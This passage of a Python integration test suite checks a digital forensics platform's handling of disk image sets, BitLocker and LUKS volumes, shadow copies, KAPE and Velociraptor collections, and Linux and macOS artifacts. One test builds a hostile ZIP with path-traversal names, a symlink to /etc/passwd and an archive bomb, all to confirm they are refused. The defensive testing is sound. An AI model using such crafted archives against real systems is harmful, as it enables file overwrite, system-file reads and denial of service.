    j = _analyse(inv, r.json['evidence_id'], {'profile': 'quick'}) if ok else {}
    check('a split raw image: its parts in order, each hashed, the whole hashed as the disk, read as the disk',
          ok and [(f['name'], f['sha256']) for f in r.json['image_files']] == [(n, _sha(d)) for n, d in parts]
          and r.json['sha256'] == C['IMG_SHA256'] and j.get('status') == 'COMPLETED'
          and _working_copy(db, r.json['evidence_id']).get('sha256') == C['IMG_SHA256'] and _indexed(db, r.json['evidence_id']) == raw_files,
          (r, j.get('status'), j.get('error')))
    C['SPLIT_E'] = r.json.get('evidence_id')
    v = post(f"/api/evidence/{C['SPLIT_E']}/verify", inv)
    check('verifying an image set re-hashes every part', v.status == 200 and v.json['verification_status'] == 'VERIFIED', v)
    stored = Path(r.json['image_files'][1]['path'])
    stored.chmod(0o644)
    keep = stored.read_bytes()
    stored.write_bytes(keep[:-1] + bytes([keep[-1] ^ 1]))
    v = post(f"/api/evidence/{C['SPLIT_E']}/verify", inv)
    check('a changed part fails verification, and the part is named', v.json['verification_status'] == 'INTEGRITY_FAILED'
          and v.json.get('changed_files') == ['laptop.dd.002'], v)
    stored.write_bytes(keep)
    stored.chmod(0o444)
    post(f"/api/evidence/{C['SPLIT_E']}/verify", inv)

    # EnCase segments, made with ewfacquirestream: all, a missing middle one, a missing last one.
    with IMG.open('rb') as src:
        sh_proc = subprocess.run(['ewfacquirestream', '-t', str(work / 'seg'), '-C', 'TEST', '-D', 'segments', '-E', 'EV2', '-e', 'tester',
                                  '-N', 'none', '-f', 'encase6', '-c', 'none', '-S', str(20 << 20), '-q'], stdin=src, capture_output=True, timeout=600)
    segs = sorted(work.glob('seg.E*'))
    check('ewfacquirestream made four segments', [p.name for p in segs] == ['seg.E01', 'seg.E02', 'seg.E03', 'seg.E04'], (segs, sh_proc.stderr[-200:]))
    if len(segs) == 4:
        files = [(p.name, p.read_bytes()) for p in segs]
        mid = upload_set(inv, case, [files[0], files[1], files[3]])
        last = upload_set(inv, case, files[:3])
        check('missing segments are refused: a gap names the segment, a missing last one is noticed from the segments themselves',
              mid.status == 400 and '.E03' in mid.detail and last.status == 400 and 'not the last segment' in last.detail, (mid, last))
        r = upload_set(inv, case, files)
        j = _analyse(inv, r.json['evidence_id'], {'profile': 'quick'}) if r.status == 200 else {}
        check('four EnCase segments: one evidence item, checked with ewfverify, read as the disk',
              r.status == 200 and r.json['format'] == 'E01' and r.json['image_set']['count'] == 4 and j.get('status') == 'COMPLETED'
              and _working_copy(db, r.json['evidence_id']).get('sha256') == C['IMG_SHA256']
              and _working_copy(db, r.json['evidence_id']).get('stored_md5_match') is True, (r, j.get('status'), j.get('error')))

    # The dfVFS split samples are ext2.raw in pieces.
    ext2 = sample('dfvfs', 'ext2.raw')
    for names in (('ext2.split.E01', 'ext2.split.E02'), ('ext2.splitraw.000', 'ext2.splitraw.001')):
        ps = [sample('dfvfs', n) for n in names]
        if not ext2 or not all(ps):
            note(names[0], 'dfVFS sample not downloaded; skipped')
            continue
        r = upload_set(inv, case, [(p.name, p.read_bytes()) for p in ps])
        j = _analyse(inv, r.json['evidence_id'], {'profile': 'quick'}) if r.status == 200 else {}
        check(f'{names[0]} and its next part read as ext2.raw', j.get('status') == 'COMPLETED'
              and _working_copy(db, r.json['evidence_id']).get('sha256') == _sha(ext2.read_bytes()), (r, j.get('status'), j.get('error')))
    check('another investigator cannot see the image sets (404)', get(f"/api/evidence/{C['SPLIT_E']}", C['INV2']).status in (403, 404))


BDE_FILES = {'/a_directory', '/a_directory/a_file', '/a_directory/another_file', '/passwords.txt'}  # dfVFS's BitLocker To Go test volume


@section('12t Encrypted volumes: BitLocker To Go and LUKS unlocked with their keys (vs an independent LUKS decryption and the dfVFS contents)')
def t_encrypted_volumes():
    inv = C['INVESTIGATOR']
    db = mongo()
    bde, luks = sample('dfvfs', 'bdetogo.raw'), sample('dfvfs', 'luks1.raw')
    if not bde or not luks:
        note('encrypted volumes', 'dfVFS samples not downloaded; skipped')
        return
    case = C['CRYPT_CASE'] = post('/api/cases', inv, {'name': 'Encrypted volumes', 'priority': 'LOW'}).json['case_id']
    ev = upload(inv, case, bde.read_bytes(), 'usb-stick.dd').json['evidence_id']
    _analyse(inv, ev, {'profile': 'quick'})
    vols = get(f'/api/evidence/{ev}/volumes', inv).json['data']
    check('the volume list shows the BitLocker volume, locked', [(v['volume_id'], v['encryption'], v['decrypted']) for v in vols] == [('p0', 'BitLocker', None)], vols)
    path = f'/api/evidence/{ev}/volumes/p0/unlock'
    check('a viewer cannot unlock (403); another investigator sees no evidence (404)',
          post(path, C['VIEWER'], {'method': 'password', 'secret': 'bde-TEST'}).status == 403
          and post(path, C['INV2'], {'method': 'password', 'secret': 'bde-TEST'}).status == 404)
    wrong = post(path, inv, {'method': 'password', 'secret': 'not-the-password'})
    badrec = post(path, inv, {'method': 'recovery_password', 'secret': '123456-123456-123456-123456-123456-123456-123456-123456'})
    check('a wrong password is refused (400) and audited; a malformed recovery password is refused before trying it',
          wrong.status == 400 and 'does not unlock' in wrong.detail and badrec.status == 400 and 'divisible by 11' in badrec.detail
          and db.audit_logs.find_one({'action': 'VOLUME_UNLOCK_FAILED', 'metadata.evidence_id': ev}), (wrong, badrec))
    r = post(path, inv, {'method': 'password', 'secret': 'bde-TEST'})
    j = wait_job(inv, r.json['job_id']) if r.status == 200 else {}
    new = (j.get('result') or {}).get('derived_evidence_id')
    d = db.evidence.find_one({'evidence_id': new}) or {}
    a = wait_job(inv, j['result']['analysis_job_id']) if new else {}
    files = {x['path'] for x in db.fs_entries.find({'evidence_id': new, 'is_virtual': False})}
    fsstat = sh('fsstat', d.get('storage_path', '/nonexistent')).stdout.decode()
    check('the right password decrypts the volume into new evidence (its own hash), analysed: the files dfVFS put on it, '
          'a file system the Sleuth Kit reads', r.status == 200 and j.get('status') == 'COMPLETED' and d.get('derived_from', {}).get('volume_id') == 'p0'
          and d['sha256'] == _sha(Path(d['storage_path']).read_bytes()) and a.get('status') == 'COMPLETED' and BDE_FILES <= files
          and 'File System Type' in fsstat, (r, j.get('status'), j.get('error'), a.get('status'), sorted(files)[:12], fsstat[:200]))
    job = db.jobs.find_one({'job_id': r.json.get('job_id')}) or {}
    leaks = [c for c in ('volume_keys', 'jobs', 'audit_logs', 'chain_of_custody', 'evidence', 'notifications')
             if 'bde-TEST' in json.dumps(list(db[c].find({}, {'_id': 0})), default=str)]
    check('the password is stored only encrypted: in no collection, job or log in clear; the job received only the key\'s reference',
          not leaks and set(job.get('payload', {})) == {'evidence_id', 'volume_id', 'key_id'}
          and db.volume_keys.find_one({'evidence_id': ev}, {'secret': 1})['secret'].startswith('gAAAAA'), (leaks, job.get('payload')))
    cust = {c['action']: c for c in db.chain_of_custody.find({'evidence_id': {'$in': [ev, new]}})}
    check('custody: the decryption on the original, the derivation on the new evidence (with its hash); the key\'s use is audited',
          cust.get('VOLUME_DECRYPTED', {}).get('derived_evidence_id') == new and cust.get('EVIDENCE_DERIVED', {}).get('sha256') == d.get('sha256')
          and db.audit_logs.find_one({'action': 'VOLUME_UNLOCKED', 'metadata.evidence_id': ev})
          and db.audit_logs.find_one({'action': 'VOLUME_KEY_USED', 'metadata.derived_evidence_id': new}), list(cust))
    vols = get(f'/api/evidence/{ev}/volumes', inv).json['data']
    again = post(path, inv, {'method': 'password', 'secret': 'bde-TEST'})
    check('the volume now points at its decrypted copy; unlocking it again is refused (409)',
          vols[0]['decrypted']['evidence_id'] == new and vols[0]['key']['method'] == 'password' and again.status == 409, (vols, again))
    C['BDE_E'], C['BDE_DERIVED'] = ev, new

    # LUKS: the decrypted volume equals what an independent LUKS1 implementation decrypts.
    ev2 = upload(inv, case, luks.read_bytes(), 'linux-disk.dd').json['evidence_id']
    _analyse(inv, ev2, {'profile': 'quick'})
    rec = post(f'/api/evidence/{ev2}/volumes/p0/unlock', inv, {'method': 'recovery_password', 'secret': '000000-' * 7 + '000000'})
    check('a LUKS volume takes a password only (400 for a recovery password)', rec.status == 400, rec)
    r = post(f'/api/evidence/{ev2}/volumes/p0/unlock', inv, {'method': 'password', 'secret': 'luksde-TEST'})
    j = wait_job(inv, r.json['job_id']) if r.status == 200 else {}
    new2 = (j.get('result') or {}).get('derived_evidence_id')
    a = wait_job(inv, j['result']['analysis_job_id']) if new2 else {}
    truth = _luks1_decrypt(luks.read_bytes(), b'luksde-TEST')
    files = {x['path'] for x in db.fs_entries.find({'evidence_id': new2, 'is_virtual': False})}
    check('LUKS: the volume decrypted by DFIP is byte for byte what an independent LUKS1 decryption gives; its ext file system is indexed',
          j.get('status') == 'COMPLETED' and (db.evidence.find_one({'evidence_id': new2}) or {}).get('sha256') == _sha(truth)
          and a.get('status') == 'COMPLETED' and {'/a_directory/a_file', '/passwords.txt'} <= files, (r, j.get('status'), j.get('error'), sorted(files)[:10]))
    fk =req('DELETE', f'/api/evidence/{ev2}/volumes/p0/key', inv)
    check('a stored key can be deleted (the decrypted copy stays); audited', fk.status == 200 and not db.volume_keys.find_one({'evidence_id': ev2})
          and db.evidence.find_one({'evidence_id': new2}) and db.audit_logs.find_one({'action': 'VOLUME_KEY_DELETED', 'metadata.evidence_id': ev2}), fk)
    C['LUKS_E'] = ev2


def _vss_listing(path: Path) -> dict:
    """Allocated files and folders of an NTFS image as fls -r -m lists them: {lower path: (path, is_dir, size, mtime)}."""
    out = {}
    for line in sh('fls', '-r', '-m', '/', str(path)).stdout.decode(errors='replace').splitlines():
        f = line.split('|')
        if len(f) < 11:
            continue
        name = '|'.join(f[1:-9])
        mode, size, mtime = f[-8], int(f[-6] or 0), int(f[-4] or 0)
        if name.endswith('($FILE_NAME)') or '(deleted' in name or mode[:1] in ('v', 'V'):
            continue
        parts = name.strip('/').split('/')
        if parts[0].lower() in ('$mft', '$mftmirr', '$logfile', '$volume', '$attrdef', '$bitmap', '$boot', '$badclus', '$secure',
                                '$upcase', '$extend', '$orphanfiles', 'system volume information') or ':' in parts[-1]:
            continue
        out[name.lower()] = (name, mode.startswith('d'), size, mtime)
    return out


@section('12u Volume Shadow Copies (vs vshadowinfo, and fls on each snapshot written out)')
def t_shadow_copies():
    inv = C['INVESTIGATOR']
    db = mongo()
    p = sample('dfvfs', 'vss.raw')
    if not p:
        note('shadow copies', 'dfVFS sample not downloaded; skipped')
        return
    import pyvshadow
    case = post('/api/cases', inv, {'name': 'Shadow copies', 'priority': 'LOW'}).json['case_id']
    ev = upload(inv, case, p.read_bytes(), 'server-volume.dd').json['evidence_id']
    j = _analyse(inv, ev, {'modules': ['shadow_copies']})
    stores = get(f'/api/forensics/shadow-copies/stores?case_id={case}', inv).json['data']
    info = sh('vshadowinfo', str(p)).stdout.decode()
    # Times are kept to the millisecond (MongoDB's precision); vshadowinfo prints them to the 100 ns.
    truth = [(int(n), ident, datetime.strptime(when[:-14], '%b %d, %Y %H:%M:%S').replace(tzinfo=timezone.utc) + timedelta(milliseconds=int(when[-13:-10])))
             for n, ident, when in re.findall(r'Store: (\d+)\s+Identifier\s+: (\S+).*?Creation time\s+: (.+? UTC)', info, re.S)]
    check('the two shadow copies, their identifiers and creation times, as vshadowinfo reads them',
          j['status'] == 'COMPLETED' and [(s['store'], s['identifier'], iso(s['created'])) for s in stores] == truth and len(truth) == 2,
          (j.get('error'), stores, truth))

    # Each snapshot written out with libvshadow and listed with fls, compared with fls on the volume now.
    vol = pyvshadow.volume()
    vol.open(str(p))
    now = _vss_listing(p)
    for s in stores:
        snap_file = Path(tempfile.mkdtemp()) / f"store{s['store']}.raw"
        st = vol.get_store(s['store'] - 1)
        with snap_file.open('wb') as out:
            for pos in range(0, st.volume_size, 1 << 22):
                out.write(st.read_buffer_at_offset(min(1 << 22, st.volume_size - pos), pos))
        then = _vss_listing(snap_file)
        want = {('DELETED_SINCE', v[0]) for k, v in then.items() if k not in now} | {('ADDED_SINCE', v[0]) for k, v in now.items() if k not in then} \
            | {('CHANGED_SINCE', v[0]) for k, v in then.items() if k in now and not v[1] and (v[2], v[3]) != now[k][2:]}
        got = {(x['change'], x['path']) for x in get(f"/api/forensics/shadow-copies?case_id={case}&volume_id={s['volume_id']}&limit=500", inv).json['data']}
        counts = s.get('counts') or {}
        check(f"shadow copy {s['store']}: files added, changed and deleted since are what fls finds comparing the snapshot with the volume now",
              got == want and want and counts.get('added_since') == sum(1 for c, _ in want if c == 'ADDED_SINCE'), (sorted(got), sorted(want)))
        if s['store'] == 1:
            root = get(f"/api/forensics/shadow-copies/browse?evidence_id={ev}&volume_id={s['volume_id']}&path=/", inv).json['data']
            # fls lists named streams as name:stream ($Secure only so) and Sleuth Kit's virtual $OrphanFiles (V/V).
            fls_root = {re.split(r':\t', x, 1)[1].split(':')[0] for x in sh('fls', str(snap_file)).stdout.decode().splitlines()
                        if ':\t' in x and '*' not in x.split(':')[0] and not x.lower().startswith('v/v')}
            check('browsing a snapshot lists its root folder as fls does', {x['name'] for x in root} == fls_root,
                  (sorted(x['name'] for x in root), sorted(fls_root)))
            pw = next(x for x in root if x['name'] == 'passwords.txt')
            r = post('/api/forensics/shadow-copies/recover', inv, {'evidence_id': ev, 'volume_id': s['volume_id'], 'inode': pw['inode'], 'path': '/passwords.txt'})
            icat = sh('icat', str(snap_file), pw['inode']).stdout
            art = db.forensic_artifacts.find_one({'artifact_id': r.json.get('artifact_id')}) or {}
            check('a file recovered from a snapshot is what icat reads from the snapshot written out; custody records which copy',
                  r.status == 200 and r.json['sha256'] == _sha(icat) and art.get('source') == 'VSS' and art.get('volume_id') == s['volume_id']
                  and db.chain_of_custody.find_one({'artifact_id': r.json.get('artifact_id'), 'volume_id': s['volume_id']}), r)
            import base64
            pg = get(f"/api/forensics/shadow-copies/content?evidence_id={ev}&volume_id={s['volume_id']}&inode={pw['inode']}", inv).json
            check('the file viewer reads the snapshot\'s version', base64.b64decode(pg.get('data_b64') or '') == icat[:4096], pg.get('size'))
            check('a viewer may browse but not recover (403); another investigator sees nothing (404)',
                  get(f"/api/forensics/shadow-copies/browse?evidence_id={ev}&volume_id={s['volume_id']}", C['VIEWER']).status in (200, 404)
                  and post('/api/forensics/shadow-copies/recover', C['VIEWER'], {'evidence_id': ev, 'volume_id': s['volume_id'], 'inode': pw['inode']}).status == 403
                  and get(f'/api/forensics/shadow-copies/stores?case_id={case}', C['INV2']).status == 404
                  and get(f"/api/forensics/shadow-copies/browse?evidence_id={ev}&volume_id={s['volume_id']}", C['INV2']).status == 404)
        snap_file.unlink()
    events = list(db.timeline_events.find({'evidence_id': ev, 'type': 'SHADOW_COPY_CREATED'}).sort('timestamp', 1))
    check('each shadow copy\'s creation is on the timeline', [e['timestamp'].replace(tzinfo=timezone.utc) for e in events] == [t for _, _, t in truth], events)
    bad = get(f'/api/forensics/shadow-copies/browse?evidence_id={ev}&volume_id=p0/vss9', inv)
    check('an unknown shadow copy is 404, a volume id that is not a shadow copy 400', bad.status == 404
          and get(f'/api/forensics/shadow-copies/browse?evidence_id={ev}&volume_id=p0', inv).status == 400, bad)
    rec = next(iter(get(f'/api/forensics/shadow-copies?case_id={case}&limit=1', inv).json['data']), {})
    t = post('/api/tags', inv, {'case_id': case, 'item_type': 'SHADOW_FILE', 'item_id': rec.get('_id'), 'label': 'NOTABLE'})
    j2 = _analyse(inv, ev, {'modules': ['shadow_copies']})
    tag = next((x for x in get(f'/api/tags?case_id={case}', inv).json['data'] if x['tag_id'] == (t.json or {}).get('tag_id')), {})
    check('a shadow copy record can be tagged, and the tag follows it when the module runs again',
          t.status == 200 and j2['result']['summary'].get('tags', {}).get('unresolved') == 0 and tag.get('item_id') != rec.get('_id')
          and 'shadow copy' in ((tag.get('snapshot') or {}).get('detail') or ''), (t, tag))
    C['VSS_CASE'], C['VSS_E'] = case, ev


# Phase 13: logical packages, Linux and macOS, more file systems, Plaso timelines.
KAPE_ZIP, VELO_ZIP = Path('/testdata/dfip-test-kape.zip'), Path('/testdata/dfip-test-velociraptor.zip')
MAC_TAR, LINUX_IMG = Path('/testdata/dfip-test-macos.tar'), Path('/testdata/dfip-linux-disk.dd')
UNIX_EXPECTED, DISK_MANIFEST = Path('/testdata/unix-expected.json'), Path('/testdata/dfip-test-disk.manifest.json')
PLASO_JSON, PLASO_CSV = Path('/testdata/dfip-test-disk.plaso.jsonl'), Path('/testdata/dfip-test-disk.plaso.csv')
# Records made by investigators' actions on the disk evidence (recovery, carving, scans), not by its analysis.
ACTION_TYPES = {'RECOVERED_FILE', 'CARVED_FILE', 'YARA_SCAN'}


def _dt(v):
    if isinstance(v, str):
        return iso(v)
    return v.replace(tzinfo=timezone.utc) if isinstance(v, datetime) and v.tzinfo is None else v


def _type_counts(db, eid):
    """Records the analysis wrote (not investigators' actions), about files that exist (a collection has no deleted files)."""
    return {x['_id']: x['n'] for x in db.forensic_artifacts.aggregate([
        {'$match': {'evidence_id': eid, 'pipeline': True, 'deleted': {'$ne': True}, 'type': {'$nin': list(ACTION_TYPES)}}},
        {'$group': {'_id': '$type', 'n': {'$sum': 1}}}])}


@section('12v Logical packages (KAPE and Velociraptor collections vs the disk image they were taken from, and the generator manifest)')
def t_packages():
    inv = C['INVESTIGATOR']
    db = mongo()
    if not KAPE_ZIP.exists():
        note('logical packages', 'make-test-image.sh has not made the packages; skipped')
        return
    truth = {f['path']: f for f in json.loads(DISK_MANIFEST.read_text())['files'] if not f['deleted']}
    case = C['PKG_CASE'] = post('/api/cases', inv, {'name': 'Logical collections', 'priority': 'LOW'}).json['case_id']
    data = KAPE_ZIP.read_bytes()
    r = upload(inv, case, data, KAPE_ZIP.name)
    check('a ZIP collection uploads as one logical evidence item, hashed as uploaded',
          r.status == 200 and r.json['format'] == 'LOGICAL' and r.json['package']['archive'] == 'ZIP' and r.json['sha256'] == _sha(data), r)
    ev = r.json['evidence_id']
    j = _analyse(inv, ev, {'profile': 'full'})  # as the disk image was analysed
    e = db.evidence.find_one({'evidence_id': ev})
    pkg = e.get('package') or {}
    cust = db.chain_of_custody.find_one({'evidence_id': ev, 'action': 'PACKAGE_UNPACKED'}) or {}
    check('unpacked once, read-only: the system drive found under the collection folder, the manifest hashed into the chain of custody',
          j['status'] == 'COMPLETED' and [(x['path'], x['os'], x['volume_id']) for x in pkg.get('roots', [])] == [('2026-09-01T190512_LAPTOP-07/C', 'windows', 'pkg')]
          and cust.get('sha256') == _sha(Path(pkg['manifest']).read_bytes()) and pkg.get('files') == len(truth) + 1, (j.get('error'), pkg, cust))
    files = {x['path']: x for x in db.fs_entries.find({'evidence_id': ev, 'is_dir': False, 'logical': True})}
    bad = [p for p, t in truth.items() if not files.get(p) or files[p].get('sha256') != t['sha256'] or files[p].get('size') != t['size']
           or _dt(files[p].get('mtime')) != iso(t['mtime'])]
    check('every collected file is indexed at its path on the computer, with the size, SHA-256 and modification time the generator gave it '
          '(times from the NTFS extra field, in UTC)', set(files) == set(truth) and not bad, (sorted(set(files) ^ set(truth))[:5], bad[:5]))
    disk, package = _type_counts(db, C['E']), _type_counts(db, ev)
    diff = {t: (disk.get(t), package.get(t)) for t in set(disk) | set(package) if disk.get(t) != package.get(t)}
    same = {c: (db[c].count_documents({'evidence_id': C['E']}), db[c].count_documents({'evidence_id': ev})) for c in ('event_records', 'email_messages', 'usb_artifacts')}
    check('the collection gives the same results as the disk image: every kind of record in the same number (registry, event logs, browsers, '
          'email, chat, Windows activity, programs, indicators ...), as many event records, emails and USB devices',
          not diff and all(a == b and a for a, b in same.values()), (diff, same))
    import base64
    pn = files['/Users/alice/Documents/project-notes.txt']
    pg = get(f"/api/forensics/evidence/{ev}/content?inode={urllib.parse.quote(pn['inode'])}&offset=0", inv).json
    rec = post(f"/api/forensics/evidence/{ev}/recover?inode={urllib.parse.quote(pn['inode'])}", inv)
    check('the file viewer and recovery read collected files (recovered with the SHA-256 the generator gave it)',
          base64.b64decode(pg.get('data_b64') or '') == icat_bytes('/Users/alice/Documents/project-notes.txt')
          and rec.status == 200 and rec.json['sha256'] == truth['/Users/alice/Documents/project-notes.txt']['sha256'], (pg.get('size'), rec))
    check('disk-only views refuse a collection clearly (409): partitions, carving', get(f'/api/forensics/evidence/{ev}/partitions', inv).status == 409
          and post(f'/api/forensics/evidence/{ev}/carve?engine=photorec', inv).status == 409)
    C['KAPE_E'] = ev

    # Velociraptor: the drive under uploads/auto/C%3A, URL-decoded; times from the extended timestamp field.
    data = VELO_ZIP.read_bytes()
    ev2 = upload(inv, case, data, VELO_ZIP.name).json['evidence_id']
    j = _analyse(inv, ev2, {'profile': 'quick'})
    pkg = db.evidence.find_one({'evidence_id': ev2}).get('package') or {}
    files = {x['path']: x for x in db.fs_entries.find({'evidence_id': ev2, 'is_dir': False, 'logical': True})}
    reg = lambda eid: {t: n for t, n in _type_counts(db, eid).items() if t in ('USERASSIST', 'SHELLBAG', 'BAM_ENTRY', 'AMCACHE_FILE', 'BROWSER_HISTORY',
                                                                                'PROGRAM_RUN', 'RECYCLE_BIN_ITEM', 'USER_ACCOUNT')}
    check('a Velociraptor collection: the URL-encoded drive (C%3A) decoded and found, every file with its time, the same registry, browser and '
          'activity records as the disk', j['status'] == 'COMPLETED' and [x['path'] for x in pkg.get('roots', [])] == ['uploads/auto/C:']
          and set(files) == set(truth) and all(_dt(files[p].get('mtime')) == iso(t['mtime']) for p, t in truth.items()) and reg(ev2) == reg(C['E']),
          (pkg.get('roots'), sorted(set(files) ^ set(truth))[:4], reg(ev2), reg(C['E'])))

    # A hostile package: names that climb out, absolute names, a link; and an archive bomb.
    import io
    import stat as stat_mod
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('C/Users/bob/ok.txt', 'fine')
        z.writestr('../../escaped.txt', 'out')
        z.writestr('/abs/escaped2.txt', 'out')
        z.writestr('C/Users/bob/../../../escaped3.txt', 'out')
        link = zipfile.ZipInfo('C/Users/bob/link')
        link.external_attr = (stat_mod.S_IFLNK | 0o777) << 16
        z.writestr(link, '/etc/passwd')
    ev3 = upload(inv, case, buf.getvalue(), 'hostile.zip').json['evidence_id']
    j = _analyse(inv, ev3, {'profile': 'quick'})
    pkg = db.evidence.find_one({'evidence_id': ev3}).get('package') or {}
    import glob
    escaped = [p for p in glob.glob('/app/storage/**/escaped*.txt', recursive=True) if not p.startswith(f'/app/storage/analysis/package/{ev3}/')]
    listed = sorted(x['path'] for x in db.fs_entries.find({'evidence_id': ev3, 'is_dir': False}))
    manifest = [json.loads(x) for x in Path(pkg.get('manifest', '/dev/null')).read_text().splitlines()] if pkg.get('manifest') else []
    check('names that climb out of the package are refused (an absolute name stays inside it), a link is recorded but not followed: '
          'nothing lands outside, and only the file under the drive is indexed',
          j['status'] == 'COMPLETED' and not escaped and listed == ['/Users/bob/ok.txt'] and pkg.get('skipped') == 2 and pkg.get('links') == 1
          and {m.get('reason') for m in manifest if m['kind'] == 'skipped'} == {'unsafe name'}, (j.get('error'), escaped, listed, pkg))
    bomb = Path(tempfile.mkdtemp()) / 'bomb.zip'
    with zipfile.ZipFile(bomb, 'w', zipfile.ZIP_DEFLATED) as z:
        zinfo = zipfile.ZipInfo('C/Windows/zeros.bin')
        zinfo.compress_type = zipfile.ZIP_DEFLATED
        with z.open(zinfo, 'w', force_zip64=True) as f:
            for _ in range(1100):
                f.write(bytes(1 << 20))
    ev4 = upload(inv, case, bomb.read_bytes(), 'bomb.zip').json['evidence_id']
    j = _analyse(inv, ev4, {'profile': 'quick'})
    check('an archive bomb (1.1 GiB of zeros in a ~1 MiB ZIP) is refused before anything is written', j['status'] == 'FAILED'
          and 'archive bomb' in (j.get('error') or '') and not Path(f'/app/storage/analysis/package/{ev4}').exists(), (j['status'], j.get('error')))
    folder = Path(f'/app/storage/analysis/package/{ev2}')
    had = folder.is_dir() and Path(f'/app/storage/analysis/package/{ev2}.manifest.jsonl').exists()
    d = req('DELETE', f'/api/evidence/{ev2}', inv, {'reason': 'Velociraptor test finished'})
    check('deleting a collection removes its unpacked files and manifest', had and d.status == 200 and not folder.exists()
          and not Path(f'/app/storage/analysis/package/{ev2}.manifest.jsonl').exists(), d)


@section('12w Linux and macOS (an ext4 disk of a Linux server and a TAR collection of a Mac, vs the generator)')
def t_unix():
    inv = C['INVESTIGATOR']
    db = mongo()
    if not LINUX_IMG.exists() or not UNIX_EXPECTED.exists():
        note('Linux and macOS', 'make-test-image.sh has not made them; skipped')
        return
    want = json.loads(UNIX_EXPECTED.read_text())
    L, M = want['linux'], want['macos']
    case = C['UNIX_CASE'] = post('/api/cases', inv, {'name': 'Linux server and Mac', 'priority': 'LOW'}).json['case_id']
    ev = upload(inv, case, LINUX_IMG.read_bytes(), 'build-01.dd').json['evidence_id']
    j = _analyse(inv, ev, {'profile': 'standard'})
    docs = lambda t, eid=ev: list(db.forensic_artifacts.find({'evidence_id': eid, 'type': t}))
    tz = (db.analysis_facts.find_one({'evidence_id': ev}) or {}).get('tz_probe') or {}
    comp = (docs('COMPUTER_INFO') or [{}])[0]
    fs = (db.analysis_facts.find_one({'evidence_id': ev}) or {}).get('fs_index', {}).get('filesystems') or [{}]
    check('Linux: an ext4 file system; the time zone from /etc/timezone; host name and release from /etc',
          j['status'] == 'COMPLETED' and (fs[0].get('filesystem_type') or '').lower().startswith('ext4') and (tz.get('zone'), tz.get('source')) == (L['zone'], 'system')
          and (comp.get('hostname'), (comp.get('os') or {}).get('product_name'), comp.get('os_family')) == (L['hostname'], L['os'], 'Linux'),
          (j.get('error'), fs[0].get('filesystem_type'), tz, comp.get('hostname'), comp.get('os')))
    users = {u['username']: u for u in docs('USER_ACCOUNT')}
    check('accounts from /etc/passwd, /etc/group and /etc/shadow (never the hash): the second root account flagged; sudo members are admins',
          {k: v['uid'] for k, v in users.items() if k in L['accounts']} == L['accounts'] and [k for k, v in users.items() if any(f['code'] == 'UID0' for f in v['flags'])] == L['uid0_extra']
          and users['alice']['admin'] and users['alice'].get('password_state') == 'set' and 'notarealhash' not in json.dumps([dict(u, _id=0) for u in users.values()], default=str),
          {k: (v['uid'], [f['code'] for f in v['flags']], v.get('admin')) for k, v in users.items()})
    hist = sorted(docs('SHELL_COMMAND'), key=lambda c: (c['user'] != 'alice', c['order']))
    alice = [c for c in hist if c['user'] == 'alice']
    check("alice's bash history with each command's time (HISTTIMEFORMAT); the copy to another computer, wiping and the new root account flagged",
          [c['command'] for c in alice] == L['history'] and all(c['time'] for c in alice)
          and {c['command']: c['flags'][0]['code'] for c in alice if c['flags']} == L['flagged_commands'], [(c['command'], [f['code'] for f in c['flags']]) for c in alice])
    ev_ = docs('UNIX_EVENT')
    kind = lambda k: [x for x in ev_ if x['kind'] == k]
    ssh = kind('ssh_login')
    check('logins: the SSH login with its key and address (auth.log, in local time, made UTC), the earlier login in a rotated .gz log, three failed '
          'root logins (auth.log and btmp), the session in wtmp with its length',
          sorted(_dt(x['time']).isoformat() for x in ssh) == sorted([L['old_login'], L['ssh_login']['time']])
          and any(x.get('ip') == L['ssh_login']['ip'] and x.get('user') == 'alice' for x in ssh)
          and sorted(_dt(x['time']).isoformat() for x in kind('ssh_failed')) == L['ssh_failed']
          and sorted(_dt(x['time']).isoformat() for x in kind('failed_login')) == L['ssh_failed']
          and any(_dt(x['time']).isoformat() == L['session']['login'] and _dt(x.get('logout')).isoformat() == L['session']['logout']
                  and x.get('host') == L['session']['host'] for x in kind('login')), [(x['kind'], _dt(x['time'])) for x in ev_][:20])
    usb = kind('usb_connected')
    check('sudo, the account it added, the SanDisk stick plugged in (with the serial number the laptop saw), the hidden cron job running',
          [_dt(x['time']).isoformat() for x in kind('sudo')] == [L['sudo_time']] and [x['fields'].get('user') for x in kind('user_added')] == ['sysupdate']
          and [(_dt(x['time']).isoformat(), x['fields'].get('serial'), x['fields'].get('vid')) for x in usb] == [(L['usb_time'], L['usb_serial'], '0781')]
          and len(kind('cron_run')) == 2 and len(kind('boot')) == 1, [(x['kind'], x.get('fields')) for x in ev_ if x['kind'] in ('sudo', 'user_added', 'usb_connected')])
    jobs = {j_['command']: j_ for j_ in docs('SCHEDULED_JOB')}
    flagged = sorted(c for c, x in jobs.items() if any(f['code'] == 'SUSPICIOUS_COMMAND' for f in x['flags']))
    check('scheduled jobs and services: the cron job and the enabled service running hidden or temporary programs are flagged; the backup service is not',
          flagged == sorted(L['jobs_flagged']) and jobs['/tmp/.x/update --daemon']['enabled'] is True and '/usr/local/bin/backup.sh' in jobs
          and not jobs['/usr/local/bin/backup.sh']['flags'] and any(x['mechanism'] == 'ssh key' for x in jobs.values()), {c: [f['code'] for f in x['flags']] for c, x in jobs.items()})
    recent = docs('RECENT_DOCUMENT')
    ff = [b for b in docs('BROWSER_HISTORY') if b.get('browser') == 'Firefox']
    check('recently used files (GNOME): payroll.csv opened in LibreOffice Calc; Firefox history found in the Linux profile folder',
          [(x['path'], x['application'], _dt(x['visited']).isoformat()) for x in recent] == [(L['recent']['path'], L['recent']['app'], L['recent']['time'])]
          and [(b['url'], iso(b['last_visit_time']).isoformat()) for b in ff] == [(L['firefox']['url'], L['firefox']['time'])], (recent, ff))
    tl = {e['type'] for e in db.timeline_events.find({'evidence_id': ev})}
    check('the timeline has the shell commands, logins, log events and recent files', {'SHELL_COMMAND', 'UNIX_EVENT', 'RECENT_DOCUMENT', 'FILE_MACB'} <= tl, tl)

    # macOS: a TAR collection.
    data = MAC_TAR.read_bytes()
    r = upload(inv, case, data, MAC_TAR.name)
    ev2 = r.json['evidence_id']
    j = _analyse(inv, ev2, {'profile': 'standard'})
    pkg = db.evidence.find_one({'evidence_id': ev2}).get('package') or {}
    tz = (db.analysis_facts.find_one({'evidence_id': ev2}) or {}).get('tz_probe') or {}
    comp = (docs('COMPUTER_INFO', ev2) or [{}])[0]
    check('macOS (TAR collection): the root found, the time zone from the /etc/localtime link the archive recorded, computer name and version',
